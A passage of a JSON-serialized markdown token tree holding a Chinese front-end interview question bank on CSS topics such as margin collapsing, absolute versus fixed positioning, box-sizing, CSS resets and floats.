级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"CSS 工程化是为了解决以下问题：","text":"CSS 工程化是为了解决以下问题：","tokens":[{"type":"text","raw":"CSS 工程化是为了解决以下问题：","text":"CSS 工程化是为了解决以下问题：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 宏观设计：CSS 代码如何组织、如何拆分、模块结构怎样设计？\\n\\n- 编码优化：怎样写出更好的 CSS？\\n\\n- 构建：如何处理我的 CSS，才能让它的打包结果最优？\\n\\n- 可维护性：代码写完后，如何最小化后期的维护成本？\\n\\n- 用户体验：在 CSS 的使用上，有哪些坑需要注意？","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 宏观设计：CSS 代码如何组织、如何拆分、模块结构怎样设计？\\n\\n","task":false,"loose":true,"text":"宏观设计：CSS 代码如何组织、如何拆分、模块结构怎样设计？\\n","tokens":[{"type":"text","raw":"宏观设计：CSS 代码如何组织、如何拆分、模块结构怎样设计？\\n","text":"宏观设计：CSS 代码如何组织、如何拆分、模块结构怎样设计？","tokens":[{"type":"text","raw":"宏观设计：CSS 代码如何组织、如何拆分、模块结构怎样设计？","text":"宏观设计：CSS 代码如何组织、如何拆分、模块结构怎样设计？","escaped":false}]}]},{"type":"list_item","raw":"- 编码优化：怎样写出更好的 CSS？\\n\\n","task":false,"loose":true,"text":"编码优化：怎样写出更好的 CSS？\\n","tokens":[{"type":"text","raw":"编码优化：怎样写出更好的 CSS？\\n","text":"编码优化：怎样写出更好的 CSS？","tokens":[{"type":"text","raw":"编码优化：怎样写出更好的 CSS？","text":"编码优化：怎样写出更好的 CSS？","escaped":false}]}]},{"type":"list_item","raw":"- 构建：如何处理我的 CSS，才能让它的打包结果最优？\\n\\n","task":false,"loose":true,"text":"构建：如何处理我的 CSS，才能让它的打包结果最优？\\n","tokens":[{"type":"text","raw":"构建：如何处理我的 CSS，才能让它的打包结果最优？\\n","text":"构建：如何处理我的 CSS，才能让它的打包结果最优？","tokens":[{"type":"text","raw":"构建：如何处理我的 CSS，才能让它的打包结果最优？","text":"构建：如何处理我的 CSS，才能让它的打包结果最优？","escaped":false}]}]},{"type":"list_item","raw":"- 可维护性：代码写完后，如何最小化后期的维护成本？\\n\\n","task":false,"loose":true,"text":"可维护性：代码写完后，如何最小化后期的维护成本？\\n","tokens":[{"type":"text","raw":"可维护性：代码写完后，如何最小化后期的维护成本？\\n","text":"可维护性：代码写完后，如何最小化后期的维护成本？","tokens":[{"type":"text","raw":"可维护性：代码写完后，如何最小化后期的维护成本？","text":"可维护性：代码写完后，如何最小化后期的维护成本？","escaped":false}]}]},{"type":"list_item","raw":"- 用户体验：在 CSS 的使用上，有哪些坑需要注意？","task":false,"loose":true,"text":"用户体验：在 CSS 的使用上，有哪些坑需要注意？","tokens":[{"type":"text","raw":"用户体验：在 CSS 的使用上，有哪些坑需要注意？","text":"用户体验：在 CSS 的使用上，有哪些坑需要注意？","tokens":[{"type":"text","raw":"用户体验：在 CSS 的使用上，有哪些坑需要注意？","text":"用户体验：在 CSS 的使用上，有哪些坑需要注意？","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"以下三个方向都是时下比较流行的、普适性非常好的 CSS 工程化实践：","text":"以下三个方向都是时下比较流行的、普适性非常好的 CSS 工程化实践：","tokens":[{"type":"text","raw":"以下三个方向都是时下比较流行的、普适性非常好的 CSS 工程化实践：","text":"以下三个方向都是时下比较流行的、普适性非常好的 CSS 工程化实践：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"预处理器：Less、 Sass 等；","text":"预处理器：Less、 Sass 等；","tokens":[{"type":"text","raw":"预处理器：Less、 Sass 等；","text":"预处理器：Less、 Sass 等；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"重要的工程化插件： PostCss；","text":"重要的工程化插件： PostCss；","tokens":[{"type":"text","raw":"重要的工程化插件： PostCss；","text":"重要的工程化插件： PostCss；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Webpack loader 等 。","text":"Webpack loader 等 。","tokens":[{"type":"text","raw":"Webpack loader 等 。","text":"Webpack loader 等 。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 46. 什么是margin重叠问题？如何解决？\\n\\n","depth":2,"text":"46. 什么是margin重叠问题？如何解决？","tokens":[{"type":"text","raw":"46. 什么是margin重叠问题？如何解决？","text":"46. 什么是margin重叠问题？如何解决？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"问题描述： 两个块级元素的上外边距和下外边距可能会合并（折叠）为一个外边距，其大小会取其中外边距值大的那个，这种行为就是外边距折叠。需要注意的是，浮动的元素和绝对定位这种脱离文档流的元素的外边距不会折叠。重叠只会出现在垂直方向。","text":"问题描述： 两个块级元素的上外边距和下外边距可能会合并（折叠）为一个外边距，其大小会取其中外边距值大的那个，这种行为就是外边距折叠。需要注意的是，浮动的元素和绝对定位这种脱离文档流的元素的外边距不会折叠。重叠只会出现在垂直方向。","tokens":[{"type":"text","raw":"问题描述： 两个块级元素的上外边距和下外边距可能会合并（折叠）为一个外边距，其大小会取其中外边距值大的那个，这种行为就是外边距折叠。需要注意的是，浮动的元素和绝对定位这种脱离文档流的元素的外边距不会折叠。重叠只会出现在垂直方向。","text":"问题描述： 两个块级元素的上外边距和下外边距可能会合并（折叠）为一个外边距，其大小会取其中外边距值大的那个，这种行为就是外边距折叠。需要注意的是，浮动的元素和绝对定位这种脱离文档流的元素的外边距不会折叠。重叠只会出现在垂直方向。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"解决办法： 对于折叠的情况，主要有两种：兄弟之间重叠和父子之间重叠 （1）兄弟之间重叠","text":"解决办法： 对于折叠的情况，主要有两种：兄弟之间重叠和父子之间重叠 （1）兄弟之间重叠","tokens":[{"type":"text","raw":"解决办法： 对于折叠的情况，主要有两种：兄弟之间重叠和父子之间重叠 （1）兄弟之间重叠","text":"解决办法： 对于折叠的情况，主要有两种：兄弟之间重叠和父子之间重叠 （1）兄弟之间重叠","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 底部元素变为行内盒子：display: inline-block\\n\\n- 底部元素设置浮动：float\\n\\n- 底部元素的position的值为absolute/fixed","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 底部元素变为行内盒子：display: inline-block\\n\\n","task":false,"loose":true,"text":"底部元素变为行内盒子：display: inline-block\\n","tokens":[{"type":"text","raw":"底部元素变为行内盒子：display: inline-block\\n","text":"底部元素变为行内盒子：display: inline-block","tokens":[{"type":"text","raw":"底部元素变为行内盒子：display: inline-block","text":"底部元素变为行内盒子：display: inline-block","escaped":false}]}]},{"type":"list_item","raw":"- 底部元素设置浮动：float\\n\\n","task":false,"loose":true,"text":"底部元素设置浮动：float\\n","tokens":[{"type":"text","raw":"底部元素设置浮动：float\\n","text":"底部元素设置浮动：float","tokens":[{"type":"text","raw":"底部元素设置浮动：float","text":"底部元素设置浮动：float","escaped":false}]}]},{"type":"list_item","raw":"- 底部元素的position的值为absolute/fixed","task":false,"loose":true,"text":"底部元素的position的值为absolute/fixed","tokens":[{"type":"text","raw":"底部元素的position的值为absolute/fixed","text":"底部元素的position的值为absolute/fixed","tokens":[{"type":"text","raw":"底部元素的position的值为absolute/fixed","text":"底部元素的position的值为absolute/fixed","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"父子之间重叠","text":"父子之间重叠","tokens":[{"type":"text","raw":"父子之间重叠","text":"父子之间重叠","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 父元素加入：overflow: hidden\\n\\n- 父元素添加透明边框：border:1px solid transparent\\n\\n- 子元素变为行内盒子：display: inline-block\\n\\n- 子元素加入浮动属性或定位","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 父元素加入：overflow: hidden\\n\\n","task":false,"loose":true,"text":"父元素加入：overflow: hidden\\n","tokens":[{"type":"text","raw":"父元素加入：overflow: hidden\\n","text":"父元素加入：overflow: hidden","tokens":[{"type":"text","raw":"父元素加入：overflow: hidden","text":"父元素加入：overflow: hidden","escaped":false}]}]},{"type":"list_item","raw":"- 父元素添加透明边框：border:1px solid transparent\\n\\n","task":false,"loose":true,"text":"父元素添加透明边框：border:1px solid transparent\\n","tokens":[{"type":"text","raw":"父元素添加透明边框：border:1px solid transparent\\n","text":"父元素添加透明边框：border:1px solid transparent","tokens":[{"type":"text","raw":"父元素添加透明边框：border:1px solid transparent","text":"父元素添加透明边框：border:1px solid transparent","escaped":false}]}]},{"type":"list_item","raw":"- 子元素变为行内盒子：display: inline-block\\n\\n","task":false,"loose":true,"text":"子元素变为行内盒子：display: inline-block\\n","tokens":[{"type":"text","raw":"子元素变为行内盒子：display: inline-block\\n","text":"子元素变为行内盒子：display: inline-block","tokens":[{"type":"text","raw":"子元素变为行内盒子：display: inline-block","text":"子元素变为行内盒子：display: inline-block","escaped":false}]}]},{"type":"list_item","raw":"- 子元素加入浮动属性或定位","task":false,"loose":true,"text":"子元素加入浮动属性或定位","tokens":[{"type":"text","raw":"子元素加入浮动属性或定位","text":"子元素加入浮动属性或定位","tokens":[{"type":"text","raw":"子元素加入浮动属性或定位","text":"子元素加入浮动属性或定位","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 47. absolute与fixed共同点与不同点\\n\\n","depth":2,"text":"47. absolute与fixed共同点与不同点","tokens":[{"type":"text","raw":"47. absolute与fixed共同点与不同点","text":"47. absolute与fixed共同点与不同点","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"共同点：","text":"共同点：","tokens":[{"type":"text","raw":"共同点：","text":"共同点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 改变行内元素的呈现方式，将display置为inline-block  \\n\\n- 使元素脱离普通文档流，不占据空间\\n\\n- 覆盖非定位文档元素","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 改变行内元素的呈现方式，将display置为inline-block  \\n\\n","task":false,"loose":true,"text":"改变行内元素的呈现方式，将display置为inline-block  \\n","tokens":[{"type":"text","raw":"改变行内元素的呈现方式，将display置为inline-block  \\n","text":"改变行内元素的呈现方式，将display置为inline-block  ","tokens":[{"type":"text","raw":"改变行内元素的呈现方式，将display置为inline-block  ","text":"改变行内元素的呈现方式，将display置为inline-block  ","escaped":false}]}]},{"type":"list_item","raw":"- 使元素脱离普通文档流，不占据空间\\n\\n","task":false,"loose":true,"text":"使元素脱离普通文档流，不占据空间\\n","tokens":[{"type":"text","raw":"使元素脱离普通文档流，不占据空间\\n","text":"使元素脱离普通文档流，不占据空间","tokens":[{"type":"text","raw":"使元素脱离普通文档流，不占据空间","text":"使元素脱离普通文档流，不占据空间","escaped":false}]}]},{"type":"list_item","raw":"- 覆盖非定位文档元素","task":false,"loose":true,"text":"覆盖非定位文档元素","tokens":[{"type":"text","raw":"覆盖非定位文档元素","text":"覆盖非定位文档元素","tokens":[{"type":"text","raw":"覆盖非定位文档元素","text":"覆盖非定位文档元素","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"不同点：","text":"不同点：","tokens":[{"type":"text","raw":"不同点：","text":"不同点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- abuselute与fixed的根元素不同，abuselute的根元素可以设置，fixed根元素是浏览器。\\n\\n- 在有滚动条的页面中，absolute会跟着父元素进行移动，fixed固定在页面的具体位置。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- abuselute与fixed的根元素不同，abuselute的根元素可以设置，fixed根元素是浏览器。\\n\\n","task":false,"loose":true,"text":"abuselute与fixed的根元素不同，abuselute的根元素可以设置，fixed根元素是浏览器。\\n","tokens":[{"type":"text","raw":"abuselute与fixed的根元素不同，abuselute的根元素可以设置，fixed根元素是浏览器。\\n","text":"abuselute与fixed的根元素不同，abuselute的根元素可以设置，fixed根元素是浏览器。","tokens":[{"type":"text","raw":"abuselute与fixed的根元素不同，abuselute的根元素可以设置，fixed根元素是浏览器。","text":"abuselute与fixed的根元素不同，abuselute的根元素可以设置，fixed根元素是浏览器。","escaped":false}]}]},{"type":"list_item","raw":"- 在有滚动条的页面中，absolute会跟着父元素进行移动，fixed固定在页面的具体位置。","task":false,"loose":true,"text":"在有滚动条的页面中，absolute会跟着父元素进行移动，fixed固定在页面的具体位置。","tokens":[{"type":"text","raw":"在有滚动条的页面中，absolute会跟着父元素进行移动，fixed固定在页面的具体位置。","text":"在有滚动条的页面中，absolute会跟着父元素进行移动，fixed固定在页面的具体位置。","tokens":[{"type":"text","raw":"在有滚动条的页面中，absolute会跟着父元素进行移动，fixed固定在页面的具体位置。","text":"在有滚动条的页面中，absolute会跟着父元素进行移动，fixed固定在页面的具体位置。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 48. box-sizing属性？\\n\\n","depth":2,"text":"48. box-sizing属性？","tokens":[{"type":"text","raw":"48. box-sizing属性？","text":"48. box-sizing属性？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"用来控制元素的盒子模型的解析模式，默认为content-box","text":"用来控制元素的盒子模型的解析模式，默认为content-box","tokens":[{"type":"text","raw":"用来控制元素的盒子模型的解析模式，默认为content-box","text":"用来控制元素的盒子模型的解析模式，默认为content-box","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"context-box：W3C的标准盒子模型，设置元素的 height/width 属性指的是 content 部分的高/宽","text":"context-box：W3C的标准盒子模型，设置元素的 height/width 属性指的是 content 部分的高/宽","tokens":[{"type":"text","raw":"context-box：W3C的标准盒子模型，设置元素的 height/width 属性指的是 content 部分的高/宽","text":"context-box：W3C的标准盒子模型，设置元素的 height/width 属性指的是 content 部分的高/宽","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"**border-box：IE 传统盒子模型。**设置元素的 height/width 属性指的是 content + border + padding 部分的高/宽","text":"**border-box：IE 传统盒子模型。**设置元素的 height/width 属性指的是 content + border + padding 部分的高/宽","tokens":[{"type":"text","raw":"**border-box：IE 传统盒子模型。**设置元素的 height/width 属性指的是 content + border + padding 部分的高/宽","text":"**border-box：IE 传统盒子模型。**设置元素的 height/width 属性指的是 content + border + padding 部分的高/宽","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 49. 为什么要初始化 CSS 样式\\n\\n","depth":2,"text":"49. 为什么要初始化 CSS 样式","tokens":[{"type":"text","raw":"49. 为什么要初始化 CSS 样式","text":"49. 为什么要初始化 CSS 样式","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。","text":"因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。","tokens":[{"type":"text","raw":"因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。","text":"因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 50. CSS里的 visibility 属性有个 collapse 属性值是干吗用的？在不同浏览器下以后什么区别？\\n\\n","depth":2,"text":"50. CSS里的 visibility 属性有个 collapse 属性值是干吗用的？在不同浏览器下以后什么区别？","tokens":[{"type":"text","raw":"50. CSS里的 visibility 属性有个 collapse 属性值是干吗用的？在不同浏览器下以后什么区别？","text":"50. CSS里的 visibility 属性有个 collapse 属性值是干吗用的？在不同浏览器下以后什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"当一个元素的 **visibility** 属性被设置成 **collapse** 值后，对于一般的元素，它的表现跟 **hidden** 是一样的。但例外的是，如果这个元素是table相关的元素，例如table行，table group，table列，table column group，它的表现却跟 **display: none** 一样，也就是说，它们占用的空间也会释放。","text":"当一个元素的 **visibility** 属性被设置成 **collapse** 值后，对于一般的元素，它的表现跟 **hidden** 是一样的。但例外的是，如果这个元素是table相关的元素，例如table行，table group，table列，table column group，它的表现却跟 **display: none** 一样，也就是说，它们占用的空间也会释放。","tokens":[{"type":"text","raw":"当一个元素的 ","text":"当一个元素的 ","escaped":false},{"type":"strong","raw":"**visibility**","text":"visibility","tokens":[{"type":"text","raw":"visibility","text":"visibility","escaped":false}]},{"type":"text","raw":" 属性被设置成 ","text":" 属性被设置成 ","escaped":false},{"type":"strong","raw":"**collapse**","text":"collapse","tokens":[{"type":"text","raw":"collapse","text":"collapse","escaped":false}]},{"type":"text","raw":" 值后，对于一般的元素，它的表现跟 ","text":" 值后，对于一般的元素，它的表现跟 ","escaped":false},{"type":"strong","raw":"**hidden**","text":"hidden","tokens":[{"type":"text","raw":"hidden","text":"hidden","escaped":false}]},{"type":"text","raw":" 是一样的。但例外的是，如果这个元素是table相关的元素，例如table行，table group，table列，table column group，它的表现却跟 ","text":" 是一样的。但例外的是，如果这个元素是table相关的元素，例如table行，table group，table列，table column group，它的表现却跟 ","escaped":false},{"type":"strong","raw":"**display: none**","text":"display: none","tokens":[{"type":"text","raw":"display: none","text":"display: none","escaped":false}]},{"type":"text","raw":" 一样，也就是说，它们占用的空间也会释放。","text":" 一样，也就是说，它们占用的空间也会释放。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在谷歌浏览器里，使用 **collapse** 值和使用 **hidden** 值没有什么区别。","text":"在谷歌浏览器里，使用 **collapse** 值和使用 **hidden** 值没有什么区别。","tokens":[{"type":"text","raw":"在谷歌浏览器里，使用 ","text":"在谷歌浏览器里，使用 ","escaped":false},{"type":"strong","raw":"**collapse**","text":"collapse","tokens":[{"type":"text","raw":"collapse","text":"collapse","escaped":false}]},{"type":"text","raw":" 值和使用 ","text":" 值和使用 ","escaped":false},{"type":"strong","raw":"**hidden**","text":"hidden","tokens":[{"type":"text","raw":"hidden","text":"hidden","escaped":false}]},{"type":"text","raw":" 值没有什么区别。","text":" 值没有什么区别。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在火狐浏览器、Opera和IE11里，使用 **collapse** 值的效果就如它的字面意思：table的行会消失，它的下面一行会补充它的位置。","text":"在火狐浏览器、Opera和IE11里，使用 **collapse** 值的效果就如它的字面意思：table的行会消失，它的下面一行会补充它的位置。","tokens":[{"type":"text","raw":"在火狐浏览器、Opera和IE11里，使用 ","text":"在火狐浏览器、Opera和IE11里，使用 ","escaped":false},{"type":"strong","raw":"**collapse**","text":"collapse","tokens":[{"type":"text","raw":"collapse","text":"collapse","escaped":false}]},{"type":"text","raw":" 值的效果就如它的字面意思：table的行会消失，它的下面一行会补充它的位置。","text":" 值的效果就如它的字面意思：table的行会消失，它的下面一行会补充它的位置。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 51. position 跟 display、overflow、float 这些特性相互叠加后会怎么样？\\n\\n","depth":2,"text":"51. position 跟 display、overflow、float 这些特性相互叠加后会怎么样？","tokens":[{"type":"text","raw":"51. position 跟 display、overflow、float 这些特性相互叠加后会怎么样？","text":"51. position 跟 display、overflow、float 这些特性相互叠加后会怎么样？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"display 属性规定元素应该生成的框的类型；position属性规定元素的定位类型；float属性是一种布局方式，定义元素在哪个方向浮动。","text":"display 属性规定元素应该生成的框的类型；position属性规定元素的定位类型；float属性是一种布局方式，定义元素在哪个方向浮动。","tokens":[{"type":"text","raw":"display 属性规定元素应该生成的框的类型；position属性规定元素的定位类型；float属性是一种布局方式，定义元素在哪个方向浮动。","text":"display 属性规定元素应该生成的框的类型；position属性规定元素的定位类型；float属性是一种布局方式，定义元素在哪个方向浮动。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"类似于优先级机制：position：absolute/fixed优先级最高，有他们在时，float不起作用，display值需要调整。float 或者absolute定位的元素，只能是块元素或表格。","text":"类似于优先级机制：position：absolute/fixed优先级最高，有他们在时，float不起作用，display值需要调整。float 或者absolute定位的元素，只能是块元素或表格。","tokens":[{"type":"text","raw":"类似于优先级机制：position：absolute/fixed优先级最高，有他们在时，float不起作用，display值需要调整。float 或者absolute定位的元素，只能是块元素或表格。","text":"类似于优先级机制：position：absolute/fixed优先级最高，有他们在时，float不起作用，display值需要调整。float 或者absolute定位的元素，只能是块元素或表格。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 52. 为什么会出现浮动? 什么时候需要清除浮动？清除浮动有哪些方式？优缺点是什么？你认为最好的是哪一种？为什么？\\n\\n","depth":2,"text":"52. 为什么会出现浮动? 什么时候需要清除浮动？清除浮动有哪些方式？优缺点是什么？你认为最好的是哪一种？为什么？","tokens":[{"type":"text","raw":"52. 为什么会出现浮动? 什么时候需要清除浮动？清除浮动有哪些方式？优缺点是什么？你认为最好的是哪一种？为什么？","text":"52. 为什么会出现浮动? 什么时候需要清除浮动？清除浮动有哪些方式？优缺点是什么？你认为最好的是哪一种？为什么？","escaped":false}]},{"type":"heading","raw":"#### 